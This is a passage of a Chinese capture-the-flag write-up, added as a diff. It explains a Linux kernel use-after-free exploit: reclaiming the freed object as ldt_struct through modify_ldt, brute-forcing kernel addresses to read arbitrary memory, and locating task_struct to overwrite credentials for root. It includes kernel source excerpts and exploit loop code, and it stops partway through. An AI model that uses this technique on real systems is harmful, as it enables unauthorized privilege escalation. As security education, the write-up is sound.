@@ -1,0 +1,260 @@
+> 因而官方当时发了这样一个公告：
+>
+> 
+>
+> 由于笔者的英文水平自从上了大学之后便几乎没有长进，在笔者看来——`release` 指的应该就是
+> `free`，也就是说指的是前面的垂悬指针并不是题目的考察点（那这还怎么解题啊），于是有了如下对话：
+>
+> 
+>
+> ~~虽然最后直到比赛结束笔者也没解出这道题~~
+###  二、漏洞利用
+那么我们现在只有一个 UAF，而且只能写 8 字节，没法直接泄露内核相关数据，分配的 object 大小限制为 32，这无疑为我们的解题增添了一定难度
+**ldt_struct 结构体**
+笔者参照官方题解选择使用 `ldt_struct` 这个内核结构体进行进一步利用，这里先简单讲一下这是个什么东西：
+ldt 即 **局部段描述符表** （ **Local Descriptor Table** ），其中存放着 **进程的**
+段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引
+该结构体定义于内核源码 `arch/x86/include/asm/mmu_context.h` 中，如下：
+    struct ldt_struct {
+        /*
+         * Xen requires page-aligned LDTs with special permissions.  This is
+         * needed to prevent us from installing evil descriptors such as
+         * call gates.  On native, we could merge the ldt_struct and LDT
+         * allocations, but it's not worth trying to optimize.
+         */
+        struct desc_struct    *entries;
+        unsigned int        nr_entries;
+        /*
+         * If PTI is in use, then the entries array is not mapped while we're
+         * in user mode.  The whole array will be aliased at the addressed
+         * given by ldt_slot_va(slot).  We use two slots so that we can allocate
+         * and map, and enable a new LDT without invalidating the mapping
+         * of an older, still-in-use LDT.
+         *
+         * slot will be -1 if this LDT doesn't have an alias mapping.
+         */
+        int            slot;
+    };
+该结构体大小仅为 0x10，在分配时 slab 分配器毫无疑问会从 kmalloc-32
+中取，且我们可控的其前八个字节又刚好是一个指针，为我们后续的利用提供了一定的便利性
+**desc_struct 结构体**
+我们所能控制的 entries 指针为 `desc_struct` 结构体，即 **段描述符** ，定义于
+`/arch/x86/include/asm/desc_defs.h` 中，如下：
+    /* 8 byte segment descriptor */
+    struct desc_struct {
+        u16    limit0;
+        u16    base0;
+        u16    base1: 8, type: 4, s: 1, dpl: 2, p: 1;
+        u16    limit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;
+    } __attribute__((packed));
+**低 32 位**
+31~16 | 15~0  
+---|---  
+段基址的 15~0 位 | 段界限的 15~0 位  
+段基址 32 位，段界限为 20 位，其所能够表示的地址范围为：
+`段基址 + （段粒度大小 x （段界限+1）） - 1`
+**高 32 位**
+31~24 | 23 | 22 | 21 | 20 | 19~16 | 15 | 14~13 | 12 | 11~8 | 7~0  
+---|---|---|---|---|---|---|---|---|---|---  
+段基址的 31~24 位 | G | D/B | L | AVL | 段界限的 19 ~16 位 | P | DPL | S | TYPE | 段基址的
+23~16 位  
+各参数便不在此赘叙了，具其构造可以参见[全局描述符表（Global Descriptor Table） –
+arttnba3.cn](https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89)
+**modify_ldt 系统调用**
+Linux 提供给我们一个叫 `modify_ldt` 的系统调用，通过该系统调用我们可以 **获取或修改当前进程的 LDT**
+我们来看一下在内核中这个系统调用是如何操纵 ldt 的，该系统调用定义于 `/arch/x86/kernel/ldt.c` 中，如下：
+    SYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,
+            unsigned long , bytecount)
+    {
+        int ret = -ENOSYS;
+        switch (func) {
+        case 0:
+            ret = read_ldt(ptr, bytecount);
+            break;
+        case 1:
+            ret = write_ldt(ptr, bytecount, 1);
+            break;
+        case 2:
+            ret = read_default_ldt(ptr, bytecount);
+            break;
+        case 0x11:
+            ret = write_ldt(ptr, bytecount, 0);
+            break;
+        }
+        /*
+         * The SYSCALL_DEFINE() macros give us an 'unsigned long'
+         * return type, but tht ABI for sys_modify_ldt() expects
+         * 'int'.  This cast gives us an int-sized value in %rax
+         * for the return code.  The 'unsigned' is necessary so
+         * the compiler does not try to sign-extend the negative
+         * return codes into the high half of the register when
+         * taking the value from int->long.
+         */
+        return (unsigned int)ret;
+    }
+我们应当传入三个参数：func、ptr、bytecount，其中 ptr 应为指向 `user_desc` 结构体的指针，参照 man page
+可知该结构体如下：
+    struct user_desc {
+        unsigned int  entry_number;
+        unsigned int  base_addr;
+        unsigned int  limit;
+        unsigned int  seg_32bit:1;
+        unsigned int  contents:2;
+        unsigned int  read_exec_only:1;
+        unsigned int  limit_in_pages:1;
+        unsigned int  seg_not_present:1;
+        unsigned int  useable:1;
+    };
+**read_ldt()：内核任意地址读**
+定义于 `/arch/x86/kernel/ldt.c`中，我们主要关注如下逻辑：
+    static int read_ldt(void __user *ptr, unsigned long bytecount)
+    {
+    //...
+        if (copy_to_user(ptr, mm->context.ldt->entries, entries_size)) {
+            retval = -EFAULT;
+            goto out_unlock;
+        }
+    //...
+    out_unlock:
+        up_read(&mm->context.ldt_usr_sem);
+        return retval;
+    }
+在这里会 **直接调用 copy_to_user 向用户地址空间拷贝数据** ，我们不难想到的是若是能够控制 ldt->entries
+便能够完成内核的任意地址读，由此泄露出内核数据
+**write_ldt()：分配新的 ldt_struct 结构体**
+定义于 `/arch/x86/kernel/ldt.c`中，我们主要关注如下逻辑：
+    static int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)
+    {
+        //...
+        error = -EINVAL;
+        if (bytecount != sizeof(ldt_info))
+            goto out;
+        error = -EFAULT;
+        if (copy_from_user(&ldt_info, ptr, sizeof(ldt_info)))
+            goto out;
+        error = -EINVAL;
+        if (ldt_info.entry_number >= LDT_ENTRIES)
+            goto out;
+        //...
+        old_ldt       = mm->context.ldt;
+        old_nr_entries = old_ldt ? old_ldt->nr_entries : 0;
+        new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);
+        error = -ENOMEM;
+        new_ldt = alloc_ldt_struct(new_nr_entries);
+        if (!new_ldt)
+            goto out_unlock;
+        if (old_ldt)
+            memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * LDT_ENTRY_SIZE);
+        new_ldt->entries[ldt_info.entry_number] = ldt;
+        //...
+        install_ldt(mm, new_ldt);
+        unmap_ldt_struct(mm, old_ldt);
+        free_ldt_struct(old_ldt);
+        error = 0;
+    out_unlock:
+        up_write(&mm->context.ldt_usr_sem);
+    out:
+        return error;
+    }
+我们注意到在 write_ldt() 当中会使用 alloc_ldt_struct() 函数来为新的 ldt_struct 分配空间，随后将之应用到进程，
+alloc_ldt_struct() 函数定义于 `arch/x86/kernel/ldt.c` 中，我们主要关注如下逻辑：
+    /* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */
+    static struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)
+    {
+        struct ldt_struct *new_ldt;
+        unsigned int alloc_size;
+        if (num_entries > LDT_ENTRIES)
+            return NULL;
+        new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL);
+    //...
+可以看到的是，ldt_struct 结构体通过 kmalloc() 从 `kmalloc-xx` 中取，对于 slab 分配器即为从
+`kmalloc-32` 中取，由此我们可以得到如下解题思路：
+  * 先分配一个 object 后释放
+  * 通过 write_ldt() 将这个 object 重新取回
+  * 通过 UAF 更改 ldt->entries
+  * 通过 read_ldt() 搜索内核地址空间
+接下来我们考虑如何完成提权
+**Step I. 泄露 page_offset_base**
+由于开启了 kaslr 的缘故，我们需要想方法泄露内核空间相关地址，在这里官方题解给出了一种美妙的解法——我们可以 **直接爆破内核地址**
+：对于无效的地址，copy_to_user 会返回非 0 值，此时 read_ldt() 的返回值便是 `-EFAULT`，当 read_ldt()
+执行成功时，说明我们命中了内核空间
+爆破代码逻辑很容易就能写出来：
+    struct user_desc     desc;
+    size_t                 kernel_base = 0xffffffff81000000;
+    size_t                temp;
+    int                 retval;
+    //...
+    chunkSet(0);
+    chunkDel(0);
+    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
+    while(1)
+    {
+        chunkEdit(kernel_base);
+        retval = syscall(SYS_modify_ldt, 0, &temp, 8);// final param should be 8 there
+        if (retval >= 0)
+            break;
+        kernel_base += 0x200000;
+    }
+但是本题开启了 `hardened usercopy` 保护，当 copy_to_user() 的源地址为内核 .text 段（_stext,
+_etext）时 **会引起 kernel panic**
+那么这里我们可以考虑更改思路——搜索`物理地址直接映射区`， **我们的 task_struct 结构体便在这一块区域内** ，只要我们找到本进程的
+task_struct，更改 cred 的 uid 为 0，也能够完成提权
+> 物理地址直接映射区即 direct mapping area，即 **线性映射区** （不是线代那个线性映射），这块区域的线性地址到物理地址空间的映射是
+> **连续的** ，kmalloc 便从此处分配内存
+>
+> 而 vmalloc 则从 vmalloc/ioremap space 分配内存，起始地址为 `vmalloc_base`，这一块区域到物理地址间的映射是
+> **不连续的**
+这一块区域的起始地址称之为 `page_offset_base`，其地址为 `0xffff888000000000`（参见
+[这↑里↓](https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst)），我们从这个地址开始搜索即可
+    struct user_desc     desc;
+    size_t                 page_offset_base = 0xffff888000000000;
+    int                 retval;
+    //...
+    chunkSet(0);
+    chunkDel(0);
+    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
+    while(1)
+    {
+        chunkEdit(page_offset_base);
+        retval = syscall(SYS_modify_ldt, 0, &desc, 8);// final param should be 8 there
+        if (retval >= 0)
+            break;
+        page_offset_base += 0x2000000;
+    }
+**Step II. 泄露进程 task_struct 地址**
+阅读 `task_struct` 源码，观察到其主体凭证下方有个特殊的字段 `comm`：
+> /include/linux/sched.h
+    struct task_struct {
+        //...
+        /* Process credentials: */
+        /* Tracer's credentials at attach: */
+        const struct cred __rcu        *ptracer_cred;
+        /* Objective and real subjective task credentials (COW): */
+        const struct cred __rcu        *real_cred;
+        /* Effective (overridable) subjective task credentials (COW): */
+        const struct cred __rcu        *cred;
+    #ifdef CONFIG_KEYS
+        /* Cached requested key. */
+        struct key            *cached_requested_key;
+    #endif
+        /*
+         * executable name, excluding path.
+         *
+         * - normally initialized setup_new_exec()
+         * - access it with [gs]et_task_comm()
+         * - lock it with task_lock()
+         */
+        char                comm[TASK_COMM_LEN];
+        struct nameidata        *nameidata;
+        //...
+    };
+这个字段便是该进程的名字，且其位置刚好在 cred 附近，我们只需要从 `page_offset_base` 开始找当前进程的名字便能够找到当前进程的
+task_struct
+使用 prctl 系统调用我们可以修改当前进程的 task_struct 的 comm 字段，这样我们便能够更方便地进行查找：
+    prctl(PR_SET_NAME, "arttnba3pwn!");
+但是我们不能够直接搜索整个线性映射区域，这仍有可能触发 hardened usercopy 的检查，在这里官方给出了一个美妙的解法：
+观察 fork 系统调用的源码，我们可以发现如下执行链：
+    sys_fork()
+        kernel_clone()
+            copy_process()
+                copy_mm()
